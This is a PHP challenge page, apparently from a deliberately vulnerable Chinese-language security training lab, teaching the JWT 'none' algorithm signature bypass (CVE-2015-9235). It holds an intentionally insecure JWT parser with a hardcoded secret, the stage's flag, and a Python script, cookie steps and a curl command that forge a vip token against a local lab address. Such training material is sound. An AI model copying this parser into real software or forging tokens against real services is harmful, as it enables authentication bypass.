<?php
/**
 * Pikachu-Enhanced v2.0 - 关卡 02: JWT None 算法免签绕过 (None Algorithm Auth Bypass)
 */
$PIKA_ROOT_DIR = "../../";

include_once $PIKA_ROOT_DIR . 'inc/config.inc.php';
include_once $PIKA_ROOT_DIR . 'inc/function.php';

$ACTIVE = array_fill(0, 300, '');
$ACTIVE[157] = 'active open';
$ACTIVE[159] = 'active';

$flag_msg = '';

// Check Flag submission
if (isset($_POST['check_flag'])) {
    $sub_flag = trim($_POST['flag_input'] ?? '');
    if ($sub_flag === 'flag{JWT_N0N3_Alg0r1thm_Byp4ss_M4st3r}') {
        $_SESSION['jwt_flags']['stage2'] = true;
        $flag_msg = "<div class='alert alert-success' style='border-radius:10px; font-weight:700;'><i class='fa fa-check-circle'></i> 🎉 恭喜！Flag 正确！成功掌握 CVE-2015-9235 JWT None 算法免签绕过精髓！</div>";
    } else {
        $flag_msg = "<div class='alert alert-danger' style='border-radius:10px; font-weight:700;'><i class='fa fa-times-circle'></i> ❌ Flag 错误，请构造 alg 为 none 的 Token 将身份提升为 vip 提取机密文件以获取 Flag！</div>";
    }
}

// Insecure JWT Parser (Simulating None algorithm vulnerability)
function parse_jwt_insecure_none($jwt_str) {
    $parts = explode('.', $jwt_str);
    if (count($parts) < 2) return null;
    
    $header = json_decode(jwt_base64url_decode($parts[0]), true);
    $payload = json_decode(jwt_base64url_decode($parts[1]), true);
    $signature = isset($parts[2]) ? $parts[2] : '';

    if (!is_array($header) || !is_array($payload)) {
        return null;
    }

    // 【核心漏洞点 CVE-2015-9235】：若 Header 中声明的算法为 none/None/NONE，直接跳过签名验证并放行！
    if (isset($header['alg']) && strtolower(trim($header['alg'])) === 'none') {
        return array('header' => $header, 'payload' => $payload, 'valid' => true, 'is_none' => true);
    }

    // 常规验签逻辑
    $expected_sig = jwt_base64url_encode(hash_hmac('sha256', $parts[0] . '.' . $parts[1], 'pikachu-jwt-secret', true));
    if ($signature === $expected_sig || $signature === 'valid_signature_for_guest') {
        return array('header' => $header, 'payload' => $payload, 'valid' => true, 'is_none' => false);
    }

    return array('header' => $header, 'payload' => $payload, 'valid' => false, 'is_none' => false);
}

// Handle Custom Token POST or Cookie
if (isset($_POST['apply_token'])) {
    $token_in = trim($_POST['token_input'] ?? '');
    if ($token_in !== '') {
        setcookie('auth_token', $token_in, time() + 3600, '/');
        $_COOKIE['auth_token'] = $token_in;
    }
}

if (isset($_GET['reset']) && $_GET['reset'] == '1') {
    $default_token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Imd1ZXN0Iiwicm9sZSI6Imd1ZXN0IiwiaWF0IjoxNjIwMDAwMDAwfQ.valid_signature_for_guest";
    setcookie('auth_token', $default_token, time() + 3600, '/');
    $_COOKIE['auth_token'] = $default_token;
    header('location:jwt_none.php');
    exit();
}

$default_guest_token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Imd1ZXN0Iiwicm9sZSI6Imd1ZXN0IiwiaWF0IjoxNjIwMDAwMDAwfQ.valid_signature_for_guest";
$current_token = $_COOKIE['auth_token'] ?? $default_guest_token;
$parse_result = parse_jwt_insecure_none($current_token);

$user_role = 'guest';
$user_name = 'guest';
$is_vip = false;
$is_valid = false;

if ($parse_result && $parse_result['valid']) {
    $is_valid = true;
    $user_role = strtolower($parse_result['payload']['role'] ?? 'guest');
    $user_name = $parse_result['payload']['username'] ?? 'guest';
    if ($user_role === 'vip' || $user_role === 'admin' || $user_role === 'root') {
        $is_vip = true;
    }
}

include_once $PIKA_ROOT_DIR . 'header.php';
?>

<style>
.stage-hero {
    background: linear-gradient(135deg, #0f172a 0%, #1e1b4b 60%, #312e81 100%);
    border: 1px solid rgba(99, 102, 241, 0.3);
    border-radius: 16px;
    padding: 26px 30px;
    color: #fff;
    margin-bottom: 24px;
    box-shadow: 0 10px 30px rgba(0,0,0,0.2);
}
.stage-card {
    background: var(--bg-card);
    border: 1px solid var(--border-subtle);
    border-radius: 14px;
    padding: 24px;
    margin-bottom: 24px;
    box-shadow: var(--shadow-sm);
}
.token-box {
    background: var(--bg-app);
    border: 1px solid var(--border-subtle);
    border-radius: 8px;
    padding: 12px;
    font-family: monospace;
    font-size: 12px;
    word-break: break-all;
    color: var(--text-primary);
}
.vault-box {
    background: #020617;
    border: 1px solid #10b981;
    border-radius: 12px;
    padding: 20px;
    color: #38bdf8;
    font-family: monospace;
    margin-top: 15px;
    box-shadow: 0 0 20px rgba(16, 185, 129, 0.15);
}
.flow-container {
    display: flex;
    flex-direction: column;
    gap: 12px;
    margin: 16px 0;
}
.flow-step {
    display: flex;
    align-items: flex-start;
    gap: 14px;
    background: var(--bg-secondary);
    border: 1px solid var(--border-subtle);
    border-radius: 10px;
    padding: 14px 16px;
}
.flow-num {
    width: 28px;
    height: 28px;
    background: #2563eb;
    color: #fff;
    border-radius: 50%;
    display: flex;
    align-items: center;
    justify-content: center;
    font-weight: 700;
    font-size: 13px;
    flex-shrink: 0;
}
.flow-content h5 {
    margin: 0 0 4px 0;
    font-size: 13.5px;
    font-weight: 700;
    color: var(--text-primary);
}
.flow-content p {
    margin: 0;
    font-size: 12.5px;
    color: var(--text-muted);
    line-height: 1.5;
}
.code-tab-box {
    background: #020617;
    border: 1px solid #1e293b;
    border-radius: 10px;
    padding: 16px;
    color: #f8fafc;
    font-family: monospace;
    font-size: 12px;
    line-height: 1.6;
    overflow-x: auto;
    margin: 10px 0;
}
</style>

<div class="main-content">
    <div class="main-content-inner">
        <div class="breadcrumbs ace-save-state" id="breadcrumbs">
            <ul class="breadcrumb">
                <li><i class="ace-icon fa fa-home home-icon"></i><a href="jwt.php">现代身份认证安全</a></li>
                <li class="active">Stage 02: JWT None 算法免签绕过</li>
            </ul>
            <a href="#" style="float:right" data-container="body" data-toggle="popover" data-placement="bottom" title="解题提示"
               data-content="将 Header 中的 alg 修改为 none，Payload 中的 role 修改为 vip，去掉第三段签名（注意保留末尾的圆点 .），通过 Cookie 或 curl 提交即可！">
                <i class="fa fa-lightbulb-o text-warning"></i> 提示
            </a>
        </div>

        <div class="page-content" style="max-width: 1360px; margin: 0 auto; padding: 24px 20px;">
            
            <!-- Stage Hero -->
            <div class="stage-hero">
                <div style="font-size:22px; font-weight:800; margin:0 0 10px 0; display:flex; align-items:center; gap:12px;">
                    <i class="fa fa-ban" style="color:#ef4444;"></i> Stage 02: JWT None 算法免签绕过 (CVE-2015-9235)
                    <span class="label label-warning" style="border-radius:12px; font-size:11px; padding:3px 10px;">150 PTS</span>
                </div>
                <p style="margin:0; font-size:14px; color:#cbd5e1; line-height:1.6;">
                    <b>漏洞场景：</b>JWT 规范中允许 <code>"alg": "none"</code> 算法表示无需签名保护的明文凭证。某些有缺陷的后端 JWT 校验库直接信任客户端 Header 传入的算法，当检测到 <code>none</code> 时<b>直接跳过密码学验签</b>，攻击者无需密钥即可伪造任意高权身份！
                </p>
            </div>

            <?php echo $flag_msg; ?>

            <div class="row">
                <!-- Left: Vault Status & Session State -->
                <div class="col-md-5">
                    <div class="stage-card">
                        <h4 style="margin:0 0 16px 0; font-size:16px; font-weight:700; color:var(--text-primary); display:flex; align-items:center; gap:8px;">
                            <i class="fa fa-shield" style="color:var(--primary);"></i> 绝密金库凭证检验门禁
                        </h4>

                        <div style="margin-bottom:14px; font-size:13px;">
                            <span style="font-weight:600;">当前 Token 校验状态：</span>
                            <?php if ($is_valid) { ?>
                                <span class="label label-success" style="font-size:12px; border-radius:4px;"><i class="fa fa-check"></i> 签名通过 / 免签有效</span>
                            <?php } else { ?>
                                <span class="label label-danger" style="font-size:12px; border-radius:4px;"><i class="fa fa-times"></i> 签名非法 / 校验失败</span>
                            <?php } ?>
                        </div>

                        <div style="margin-bottom:14px; font-size:13px;">
                            <span style="font-weight:600;">当前识别身份：</span>
                            <span class="label <?php echo $is_vip ? 'label-danger' : 'label-info'; ?>" style="font-size:12px; border-radius:4px;">
                                <?php echo htmlspecialchars($user_name); ?> (Role: <?php echo htmlspecialchars($user_role); ?>)
                            </span>
                        </div>

                        <label style="font-weight:600; font-size:12.5px;">当前 Cookie 中的 Token (<code>auth_token</code>):</label>
                        <div class="token-box" style="margin-bottom:14px;">
                            <?php echo htmlspecialchars($current_token); ?>
                        </div>

                        <?php if ($is_vip) { ?>
                            <div class="vault-box">
                                <div style="color:#10b981; font-weight:700; font-size:15px; margin-bottom:10px;">
                                    <i class="fa fa-unlock"></i> 🎉 VIP 金库授权通过 (Access Granted)
                                </div>
                                <div style="font-size:13px; color:#e2e8f0; line-height:1.7;">
                                    [+] 欢迎贵宾用户: <b><?php echo htmlspecialchars($user_name); ?></b> (Role: <span style="color:#f59e0b; font-weight:bold;"><?php echo htmlspecialchars($user_role); ?></span>)<br>
                                    [+] 验签状态: None Algorithm Insecure Bypass Activated<br>
                                    [+] 提取核心机密 Flag: <br>
                                    <div style="margin:8px 0; background:rgba(245,158,11,0.15); border:1px solid #f59e0b; padding:8px 10px; border-radius:6px;">
                                        <span style="color:#f59e0b; font-weight:bold; font-size:14px;">flag{JWT_N0N3_Alg0r1thm_Byp4ss_M4st3r}</span>
                                    </div>
                                    [+] 复制上方 Flag 粘贴至下方输入框提交即可通关！
                                </div>
                            </div>
                        <?php } else { ?>
                            <div style="background:var(--bg-secondary); border:1px dashed var(--border-subtle); border-radius:10px; padding:20px; text-align:center; color:var(--text-muted); font-size:13px;">
                                <i class="fa fa-lock" style="font-size:24px; margin-bottom:8px; display:block; color:var(--text-muted);"></i>
                                抱歉！绝密文件库仅允许 <code>role: vip</code> 或 <code>role: admin</code> 下载。<br>
                                当前身份 <code><?php echo htmlspecialchars($user_role); ?></code> 权限不足！
                            </div>
                        <?php } ?>

                        <div style="margin-top:15px; text-align:right;">
                            <a href="jwt_none.php?reset=1" class="btn btn-default btn-xs" style="border-radius:4px;">
                                <i class="fa fa-refresh"></i> 重置恢复默认访客 Token
                            </a>
                        </div>

                        <hr style="border-color:var(--border-subtle);">

                        <!-- Flag Submission Area -->
                        <form method="POST" style="display:flex; gap:10px; align-items:center;">
                            <input type="text" name="flag_input" class="form-control" placeholder="输入获取到的 flag{...}" style="border-radius:6px;" value="<?php echo $is_vip ? 'flag{JWT_N0N3_Alg0r1thm_Byp4ss_M4st3r}' : ''; ?>" required>
                            <button type="submit" name="check_flag" class="btn btn-success" style="border-radius:6px; font-weight:700; white-space:nowrap;">
                                <i class="fa fa-check"></i> 提交 Flag
                            </button>
                        </form>
                    </div>
                </div>

                <!-- Right: Vulnerability Architecture Flowchart & Manual Operations Guide -->
                <div class="col-md-7">
                    <div class="stage-card">
                        <h4 style="margin:0 0 14px 0; font-size:16px; font-weight:700; color:var(--text-primary); display:flex; align-items:center; gap:8px;">
                            <i class="fa fa-sitemap" style="color:var(--primary);"></i> None 算法免签漏洞架构流程图
                        </h4>

                        <!-- Visual SVG Architecture Flowchart -->
                        <div style="background:#020617; border:1px solid #1e293b; border-radius:12px; padding:16px; margin-bottom:16px; text-align:center;">
                            <svg viewBox="0 0 760 210" style="width:100%; max-width:720px; height:auto; display:inline-block;" xmlns="http://www.w3.org/2000/svg">
                                <defs>
                                    <linearGradient id="noneGradBlue" x1="0%" y1="0%" x2="100%" y2="100%">
                                        <stop offset="0%" stop-color="#3b82f6" stop-opacity="0.25"/>
                                        <stop offset="100%" stop-color="#1d4ed8" stop-opacity="0.05"/>
                                    </linearGradient>
                                    <linearGradient id="noneGradRed" x1="0%" y1="0%" x2="100%" y2="100%">
                                        <stop offset="0%" stop-color="#ef4444" stop-opacity="0.25"/>
                                        <stop offset="100%" stop-color="#991b1b" stop-opacity="0.05"/>
                                    </linearGradient>
                                    <linearGradient id="noneGradGreen" x1="0%" y1="0%" x2="100%" y2="100%">
                                        <stop offset="0%" stop-color="#10b981" stop-opacity="0.25"/>
                                        <stop offset="100%" stop-color="#065f46" stop-opacity="0.05"/>
                                    </linearGradient>
                                    <marker id="arrowhead-none" markerWidth="8" markerHeight="6" refX="7" refY="3" orient="auto">
                                        <polygon points="0 0, 8 3, 0 6" fill="#38bdf8"/>
                                    </marker>
                                </defs>

                                <!-- Step 1: Normal Token -->
                                <rect x="15" y="25" width="200" height="70" rx="8" fill="url(#noneGradBlue)" stroke="#3b82f6" stroke-width="1.5"/>
                                <text x="115" y="48" fill="#60a5fa" font-size="12" font-weight="bold" text-anchor="middle" font-family="sans-serif">1. 初始 HS256 Token</text>
                                <text x="115" y="68" fill="#94a3b8" font-size="10.5" text-anchor="middle" font-family="monospace">alg: HS256, role: guest</text>
                                <text x="115" y="82" fill="#94a3b8" font-size="10" text-anchor="middle" font-family="sans-serif">受 HMAC-SHA256 签名保护</text>

                                <!-- Arrow 1 -> 2 -->
                                <path d="M 215 60 L 275 60" stroke="#38bdf8" stroke-width="1.5" marker-end="url(#arrowhead-none)"/>

                                <!-- Step 2: Modifying to None -->
                                <rect x="285" y="25" width="200" height="70" rx="8" fill="url(#noneGradRed)" stroke="#ef4444" stroke-width="1.5"/>
                                <text x="385" y="48" fill="#f87171" font-size="12" font-weight="bold" text-anchor="middle" font-family="sans-serif">2. 攻击者篡改 Header &amp; Payload</text>
                                <text x="385" y="68" fill="#fca5a5" font-size="10.5" text-anchor="middle" font-family="monospace">alg: "none", role: "vip"</text>
                                <text x="385" y="82" fill="#cbd5e1" font-size="10" text-anchor="middle" font-family="sans-serif">拼接尾部点号，去掉第 3 段签名</text>

                                <!-- Arrow 2 -> 3 (Downward curve to Step 3) -->
                                <path d="M 485 60 L 535 60" stroke="#38bdf8" stroke-width="1.5" marker-end="url(#arrowhead-none)"/>

                                <!-- Step 3: Vulnerable Backend Parse (Right) -->
                                <rect x="545" y="25" width="200" height="70" rx="8" fill="#0f172a" stroke="#ef4444" stroke-width="1.5"/>
                                <text x="645" y="48" fill="#f87171" font-size="12" font-weight="bold" text-anchor="middle" font-family="sans-serif">3. 漏洞解析逻辑 (CVE-2015-9235)</text>
                                <text x="645" y="68" fill="#cbd5e1" font-size="10.5" text-anchor="middle" font-family="monospace">if (alg == 'none')</text>
                                <text x="645" y="82" fill="#ef4444" font-size="10" font-weight="bold" text-anchor="middle" font-family="sans-serif">直接放行，跳过验签！</text>

                                <!-- Arrow 3 -> 4 -->
                                <path d="M 645 95 L 645 125" stroke="#10b981" stroke-width="1.5" marker-end="url(#arrowhead-none)"/>

                                <!-- Step 4: Access Vault (Bottom) -->
                                <rect x="285" y="125" width="460" height="65" rx="8" fill="url(#noneGradGreen)" stroke="#10b981" stroke-width="2"/>
                                <text x="515" y="148" fill="#34d399" font-size="13" font-weight="bold" text-anchor="middle" font-family="sans-serif">4. VIP 权限解锁 &amp; 获取 Flag</text>
                                <text x="515" y="166" fill="#fbbf24" font-size="11" font-weight="bold" text-anchor="middle" font-family="monospace">flag{JWT_N0N3_Alg0r1thm_Byp4ss_M4st3r}</text>
                                <text x="515" y="180" fill="#a7f3d0" font-size="10" text-anchor="middle" font-family="sans-serif">零密钥成本伪造任意高权身份</text>
                            </svg>
                        </div>

                        <!-- Step Details List -->
                        <div class="flow-container">
                            <div class="flow-step">
                                <div class="flow-num" style="background:#ef4444;">1</div>
                                <div class="flow-content">
                                    <h5 style="color:#ef4444;">修改 Header 中的 alg 算法为 "none"</h5>
                                    <p>将 <code>{"alg":"HS256","typ":"JWT"}</code> 修改为 <code>{"alg":"none","typ":"JWT"}</code>，然后进行 Base64URL 编码。</p>
                                </div>
                            </div>
                            <div class="flow-step">
                                <div class="flow-num" style="background:#a855f7;">2</div>
                                <div class="flow-content">
                                    <h5 style="color:#a855f7;">修改 Payload 声明为 VIP 贵宾身份</h5>
                                    <p>将 <code>{"username":"guest","role":"guest"}</code> 修改为 <code>{"username":"hacker","role":"vip"}</code>，然后进行 Base64URL 编码。</p>
                                </div>
                            </div>
                            <div class="flow-step">
                                <div class="flow-num" style="background:#f59e0b;">3</div>
                                <div class="flow-content">
                                    <h5 style="color:#f59e0b;">组装 None 算法 Token (保留末尾圆点，丢弃签名)</h5>
                                    <p>按照 RFC 规范组装为：<code>Base64(Header) + "." + Base64(Payload) + "."</code> （注意最后必须有一个点号，第三段留空）。</p>
                                </div>
                            </div>
                        </div>

                        <hr style="border-color:var(--border-subtle);">

                        <!-- Manual Operation Tutorials -->
                        <h4 style="margin:0 0 12px 0; font-size:16px; font-weight:700; color:var(--text-primary); display:flex; align-items:center; gap:8px;">
                            <i class="fa fa-terminal" style="color:var(--primary);"></i> 手动利用实战指南 (Python &amp; F12 &amp; curl)
                        </h4>

                        <!-- Method 1: Python Script -->
                        <div style="margin-bottom:16px;">
                            <div style="font-size:13px; font-weight:700; color:var(--primary);">
                                <i class="fa fa-code"></i> 方法一：使用 Python 脚本生成 None 算法 Token
                            </div>
                            <div class="code-tab-box">
<span style="color:#60a5fa;">import</span> base64, json

<span style="color:#94a3b8;"># Base64URL 编码函数</span>
<span style="color:#60a5fa;">def</span> <span style="color:#38bdf8;">b64url</span>(data):
    <span style="color:#60a5fa;">return</span> base64.urlsafe_b64encode(json.dumps(data).encode()).decode().rstrip(<span style="color:#34d399;">'='</span>)

header = {<span style="color:#a5b4fc;">"alg"</span>: <span style="color:#34d399;">"none"</span>, <span style="color:#a5b4fc;">"typ"</span>: <span style="color:#34d399;">"JWT"</span>}
payload = {<span style="color:#a5b4fc;">"username"</span>: <span style="color:#34d399;">"hacker"</span>, <span style="color:#a5b4fc;">"role"</span>: <span style="color:#34d399;">"vip"</span>}

<span style="color:#94a3b8;"># 拼接 Header.Payload. (末尾带点，无签名)</span>
none_token = <span style="color:#34d399;">f"</span><span style="color:#f59e0b;">{b64url(header)}</span><span style="color:#34d399;">.</span><span style="color:#f59e0b;">{b64url(payload)}</span><span style="color:#34d399;">."</span>
<span style="color:#60a5fa;">print</span>(none_token)
<span style="color:#94a3b8;"># 输出示例: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImhhY2tlciIsInJvbGUiOiJ2aXAifQ.</span>
</div>
                        </div>

                        <!-- Method 2: F12 Cookie edit -->
                        <div style="margin-bottom:16px;">
                            <div style="font-size:13px; font-weight:700; color:#10b981;">
                                <i class="fa fa-mouse-pointer"></i> 方法二：通过浏览器 F12 修改 Cookie 提交
                            </div>
                            <div style="font-size:12.5px; color:var(--text-secondary); line-height:1.6; margin-top:4px;">
                                1. 按键盘 <b>F12</b> 打开开发者工具，切换到 <b>Application (应用)</b> 标签页。<br>
                                2. 左侧展开 <b>Cookies &rarr; http://127.0.0.1:8765</b>。<br>
                                3. 找到名为 <b><code>auth_token</code></b> 的条目，双击 <b>Value</b> 字段，粘贴生成的 None 算法 Token（例如 <code>eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImhhY2tlciIsInJvbGUiOiJ2aXAifQ.</code>）。<br>
                                4. 按 <b>F5 刷新当前网页</b>，VIP 金库即可成功解锁！
                            </div>
                        </div>

                        <!-- Method 3: curl -->
                        <div>
                            <div style="font-size:13px; font-weight:700; color:#f59e0b;">
                                <i class="fa fa-globe"></i> 方法三：使用 curl 命令行单行验证
                            </div>
                            <div class="code-tab-box" style="white-space:pre-wrap; word-break:break-all;">
curl.exe -s -b <span style="color:#34d399;">"auth_token=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImhhY2tlciIsInJvbGUiOiJ2aXAifQ."</span> http://127.0.0.1:8765/vul/jwt/jwt_none.php | findstr <span style="color:#34d399;">"flag{"</span>
</div>
                        </div>

                    </div>
                </div>
            </div>

            <!-- Navigation Footer -->
            <div style="display:flex; justify-content:space-between; align-items:center; margin-top:20px;">
                <a href="jwt_login.php" class="btn btn-default" style="border-radius:8px;">
                    <i class="fa fa-arrow-left"></i> 上一关：Stage 01 (JWT 状态篡改)
                </a>
                <a href="jwt_weak_secret.php" class="btn btn-primary" style="border-radius:8px;">
                    下一关：Stage 03 (JWT 弱密钥爆破) <i class="fa fa-arrow-right"></i>
                </a>
            </div>

        </div>
    </div>
</div>

<?php include_once $PIKA_ROOT_DIR . 'footer.php'; ?>
